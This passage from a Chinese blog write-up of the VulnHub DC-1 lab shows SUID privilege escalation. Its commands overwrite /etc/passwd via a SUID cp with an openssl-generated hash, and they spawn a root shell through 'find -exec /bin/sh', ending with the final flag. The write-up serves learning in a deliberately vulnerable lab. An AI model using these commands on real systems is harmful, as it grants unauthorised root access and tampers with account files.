+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191552665.png" alt="image-20231119155218610"></p>
+<h6 id="cp命令提权"><a href="#cp命令提权" class="headerlink" title="cp命令提权"></a><strong>cp命令提权</strong></h6><p>同样 先赋予&#x2F;usr&#x2F;bin&#x2F;cp suid权限</p>
+<pre><code>chmod u+s /usr/bin/cp
+</code></pre>
+<p><font color='red'>拥有suid权限的程序会由rwx变为rws</font></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191558309.png" alt="image-20231119155819258"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191558944.png" alt="image-20231119155852911"></p>
+<p>使用cp将&#x2F;etc&#x2F;passwd复制到当前用户的文件夹下</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191613289.png" alt="image-20231119161306240"></p>
+<p>使用openssl生成一个密码 </p>
+<pre><code>openssl passwd -1 -salt 1*2*3 abcd   // passwd参数代表生成一个密码，-1为md5,-salt指定盐(随意),最后要跟加密的值，也就是密码
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191614387.png" alt="image-20231119161458344"></p>
+<p>使用vim编辑.&#x2F;passwd 创建一个新用户 并将密码添加在其中 使用过<code>:wq!</code>强制保存</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191609597.png" alt="image-20231119160909564"></p>
+<p>再将这个.&#x2F;passwd复制回原来的位置 </p>
+<pre><code>cp ./passwd /etc/passwd
+</code></pre>
+<p>此时在<code>su abc</code>输入密码<code>abcd</code>就是root用户了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191620814.png" alt="image-20231119162038742"></p>
+<p>那么接下来 就使用find命令对靶场进行提权</p>
+<p>首先使用find命令查找拥有suid权限的程序   在根目录下执行以下命令 </p>
+<pre><code>find / -type f -perm -u=s 2&gt;dev/null
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191342964.png" alt="image-20231119134236870"></p>
+<p>发现find命令是有suid权限的 那么我们就可以使用find来进行suid提权了</p>
+<pre><code>find / -type f -exec /bin/sh \;
+whoami
+</code></pre>
+<p>成功root</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029127.png" alt="image-20231119181109107"></p>
+<p>进入&#x2F;root文件夹 找到<code>thefinalflag.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029423.png" alt="image-20231119181153026"></p>
+<pre><code>thefinalflag.txt
+Well done!!!!
+Hopefully you&#39;ve enjoyed this and learned some new skills.
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+</code></pre>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>至此，靶场中的全部flag完全拿到了</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/2023/10/31/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-1/">http://w3nx1z1.github.io/2023/10/31/vulnhub靶场记录DC-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/10/29/2022%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B/" title="2022年美亚杯团体赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2022年美亚杯团体赛</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-1"><span class="toc-text">vulnhub靶场记录DC-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E6%8F%8F%E8%BF%B0"><span class="toc-text">靶机描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-text">靶场搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA"><span class="toc-text">渗透靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9Eip-%E6%8E%A2%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1"><span class="toc-text">一.信息搜集(寻找真实ip 探端口及服务)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90"><span class="toc-text">二.信息分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-%E8%AE%BF%E9%97%AEweb%E7%AB%99%E7%82%B9"><span class="toc-text">三.访问web站点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B-%E5%88%A9%E7%94%A8MSF-msfconsole-%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F"><span class="toc-text">四.利用MSF(msfconsole)进行渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-msfconsole%E5%91%BD%E4%BB%A4%E4%BB%8B%E7%BB%8D"><span class="toc-text">1.msfconsole命令介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%90%9C%E7%B4%A2Drupal7%E6%BC%8F%E6%B4%9E"><span class="toc-text">2.搜索Drupal7漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#searchsploit"><span class="toc-text">searchsploit</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8msfconsole%E6%89%ABexp"><span class="toc-text">3.使用msfconsole扫exp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2drupal%E6%A8%A1%E5%9D%97"><span class="toc-text">搜索drupal模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%89%E4%B8%AD%E6%A8%A1%E5%9D%97"><span class="toc-text">选中模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E9%9D%B6%E6%9C%BAip%E8%BF%90%E8%A1%8Cmsf"><span class="toc-text">设置靶机ip运行msf</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%BF%9B%E5%85%A5shell"><span class="toc-text">4.进入shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-flag1"><span class="toc-text">5.flag1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-flag2"><span class="toc-text">6.flag2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-flag3"><span class="toc-text">7.flag3</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">进入数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BB%E5%85%A5%E7%BD%91%E9%A1%B5"><span class="toc-text">登入网页</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-flag4"><span class="toc-text">8.flag4</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#hydra"><span class="toc-text">hydra</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-thefinalflag"><span class="toc-text">9.thefinalflag</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-text">suid提权</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#suid"><span class="toc-text">suid</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#find"><span class="toc-text">find</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE-x2F-%E5%8E%BB%E6%8E%89suid"><span class="toc-text">设置&#x2F;去掉suid</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9F%A5%E6%89%BEsuid"><span class="toc-text">查找suid</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#find%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-text">find命令提权</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#vim%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-text">vim命令提权</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#cp%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-text">cp命令提权</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-text">结语</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/31/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-1/" title="无题">无题</a><time datetime="2023-10-31T12:47:36.472Z" title="发表于 2023-10-31 20:47:36">2023-10-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/29/2022%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B/" title="2022年美亚杯团体赛">2022年美亚杯团体赛</a><time datetime="2023-10-29T13:27:17.754Z" title="发表于 2023-10-29 21:27:17">2023-10-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/18/2023%E9%BE%99%E4%BF%A1%E6%9D%AF%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9Bwp/" title="2023龙信杯取证复现">2023龙信杯取证复现</a><time datetime="2023-10-18T14:23:59.555Z" title="发表于 2023-10-18 22:23:59">2023-10-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/16/%E9%A6%99%E5%B1%B1%E6%9D%AF-%E5%96%B5%E5%B8%95%E6%96%AF/" title="香山杯-喵帕斯">香山杯-喵帕斯</a><time datetime="2023-10-16T02:40:06.996Z" title="发表于 2023-10-16 10:40:06">2023-10-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/13/2023%E5%B9%B4%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%8F%96%E8%AF%81wp/" title="2023蓝帽杯初赛取证wp">2023蓝帽杯初赛取证wp</a><time datetime="2023-09-13T12:55:49.254Z" title="发表于 2023-09-13 20:55:49">2023-09-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'ZClYARR22ZvT2ZwatJZ1136e-MdYXbMMI',
+      appKey: '7gejDss3xmCS5jmSo6PpiX2z',
+      avatar: 'monsterid',
+      serverURLs: 'https://zclyarr2.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
